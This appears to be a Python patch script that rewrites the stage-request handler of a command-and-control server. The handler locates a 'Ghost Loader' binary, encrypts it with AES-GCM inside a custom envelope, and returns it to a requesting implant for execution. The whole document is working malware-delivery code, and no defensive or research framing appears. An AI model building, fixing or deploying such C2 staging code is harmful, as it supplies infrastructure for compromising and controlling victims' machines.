import re

with open("c2_server/server.py", "r") as f:
    content = f.read()

# Replace the handle stage req missing logic
new_logic = r"""
    def _handle_stage_req(self, data):
        \"\"\"
        Handle a stage request — the stager is asking for the Ghost Loader binary.
        \"\"\"
        client_ip = self.client_address[0]
        env, ct = parse_envelope(data)

        short_id = "unknown"
        if env:
            short_id = env["node_id_hex"][:8]

        log_print(f"[⬇] Stage request from {short_id} ({client_ip})", Colors.BLUE)

        # Decrypt the incoming request to mathematically progress the server's AES-GCM sequence
        if env and ct:
            aad_env = bytearray(data[:ENVELOPE_SIZE])
            aad_env[16:28] = b'\x00' * 12  # zero IV for AAD
            aad_env[28:44] = b'\x00' * 16  # zero tag for AAD
            try:
                SERVER_CRYPTO.decrypt(ct, env["iv"], env["tag"], bytes(aad_env))
            except Exception as e:
                log_print(f"  └─ Failed to decrypt stage request: {e}", Colors.FAIL)

        # Look for the ghost loader binary in known locations
        ghost_paths = [
            os.path.join(PROJECT_ROOT, "build", "aegis_ghost_loader"),
            os.path.join(PROJECT_ROOT, "payloads", "ghost_loader"),
            os.path.join(PROJECT_ROOT, "build", "ghost_loader"),
        ]

        for gpath in ghost_paths:
            if os.path.exists(gpath):
                with open(gpath, "rb") as f:
                    ghost_data = f.read()
                log_print(f"  └─ Sending Ghost Loader ({len(ghost_data)} bytes)...", Colors.GREEN)

                seq = SERVER_CRYPTO.total_messages
                node_id_bytes = bytes.fromhex(env["node_id_hex"]) if env else b'\x00'*16

                # We must construct the AAD envelope *before* encryption.
                # In the C client `aegis_encrypt` is called with the envelope as AAD,
                # but the `iv` and `tag` fields within that envelope are 0 at the time of the call!
                aad_env_out = struct.pack(
                    ENVELOPE_FMT,
                    C2_MAGIC,
                    C2_MSG_STAGE_DATA,
                    len(ghost_data), # length of ciphertext (same as plaintext for GCM)
                    seq,
                    b'\x00'*12, # IV is zero during AAD
                    b'\x00'*16, # Tag is zero during AAD
                    node_id_bytes
                )

                # Encrypt the stage for the client using the correct AAD!
                ciphertext, iv, tag = SERVER_CRYPTO.encrypt(ghost_data, aad_env_out)

                # Now pack the FINAL envelope with the actual IV and TAG to send over the wire
                env_bytes = struct.pack(
                    ENVELOPE_FMT,
                    C2_MAGIC,
                    C2_MSG_STAGE_DATA,
                    len(ciphertext),
                    seq,
                    iv,
                    tag,
                    node_id_bytes
                )

                log_print(f"  └─ Encrypted Stage Payload ({len(ciphertext)} bytes, IV: {iv.hex()})", Colors.GREEN)
                log_print(f"  └─ Waiting for Ghost Loader execution...", Colors.GREEN)
                return env_bytes + ciphertext

        log_print(f"  └─ Ghost loader not found in any known path!", Colors.FAIL)
        log_print(f"     Searched: {', '.join(ghost_paths)}", Colors.FAIL)
        return b""
"""

# Find the old _handle_stage_req
pattern = re.compile(r'    def _handle_stage_req\(self, data\):.*?return b""\n', re.DOTALL)

# Need to replace the backslashes so re.sub doesn't interpret them as escapes
new_logic_sub = new_logic.strip().replace('\\', '\\\\')

new_content = pattern.sub(new_logic_sub + "\n", content)

with open("c2_server/server.py", "w") as f:
    f.write(new_content)
print("Patch applied.")
